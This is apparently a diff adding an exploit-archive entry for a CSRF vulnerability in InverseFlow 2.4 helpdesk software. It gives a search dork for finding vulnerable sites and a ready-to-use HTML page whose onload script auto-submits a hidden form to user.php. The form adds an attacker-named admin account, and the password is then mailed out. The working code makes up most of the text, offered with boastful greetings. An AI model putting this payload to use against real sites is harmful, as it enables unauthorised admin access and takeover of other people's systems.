@@ -1,0 +1,73 @@
+#(+) Exploit Title: InverseFlow v2.4 CSRF Vulnerabilities (Add Admin User) 
+
+#(+) Version   : 2.4
+
+#(+) Author    : EjRaM HaCkEr  
+
+#(+) Contact   : m2z()9.cn
+
+#(+) Dork      : inurl:"ticket.php?cmd=lost"
+#(+) Software Link : http://asria.info/download/script/inverseflow.zip 
+
+
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  
+
+
+# All you have to do is save the below code as exploit.html  
+
+# will automatically add the attacker as Admin without warning ;)
+
+# The password will be sent automatically to email ;)
+
+
+
+Code:  
+
+
+
+<html>
+<head>
+</head>
+<body onload="javascript:fireForms()">
+<script language="JavaScript">
+var pauses = new Array( "2360" );
+
+function pausecomp(millis)
+{
+    var date = new Date();
+    var curDate = null;
+
+    do { curDate = new Date(); }
+    while(curDate-date < millis);
+}
+
+function fireForms()
+{
+    var count = 1;
+    var i=0;
+    
+    for(i=0; i<count; i++)
+    {
+        document.forms[i].submit();
+        
+        pausecomp(pauses[i]);
+    }
+}
+    
+</script>
+<form method="POST" name="form0" action="http://localhost/support/user.php">
+<input type="hidden" name="cmd" value="add"/>
+<input type="hidden" name="name" value="ejram hacker"/>
+<input type="hidden" name="email" value="ejram@gmail.com"/>
+</form>
+
+</body>
+</html>
+
+########################################################################  
+
+(+)Exploit Coded by: EjRaM HaCkEr   
+
+(+)Gr33ts to : tryag.cc + r00t-s3c.com + v99x.com :)  
+
+########################################################################
